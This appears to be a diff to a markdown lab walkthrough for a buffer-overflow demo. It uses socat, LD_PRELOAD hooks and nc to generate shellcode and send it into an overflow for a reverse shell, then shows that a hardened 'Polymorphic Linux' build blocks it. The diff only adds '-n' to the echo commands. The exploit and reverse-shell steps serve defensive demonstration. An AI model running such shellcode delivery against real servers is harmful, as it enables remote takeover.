@@ -32,7 +32,7 @@ socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD='/tmp/ful
 ## Generate Shell-Code and Perform Exploit
 ### (3) Generate shell-code for the exploit (Session-3)
 ```
-export shellCode=$(echo "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
+export shellCode=$(echo -n "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
 ```
 ### (2) Re-start socat with minimal readhook in front of libc
 ```
@@ -40,7 +40,7 @@ socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/base
 ```
 ### (3) Send shell-code to the OVERFLOW for a reverse shell
 ```
-echo $shellCode | nc localhost 8080
+echo -n $shellCode | nc localhost 8080
 ```
 ### (1) Check that the overflow resulted in a remote shell
 ```
@@ -62,7 +62,7 @@ socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/base
 ```
 ### (3) Try the shellCode with Polymorphic Linux
 ```
-echo $shellCode | nc localhost 8080
+echo -n $shellCode | nc localhost 8080
 ```
 ### (1) Confirm that nobody phoned-home to the listener
 ### (2) Confirm that the server terminated abnormally
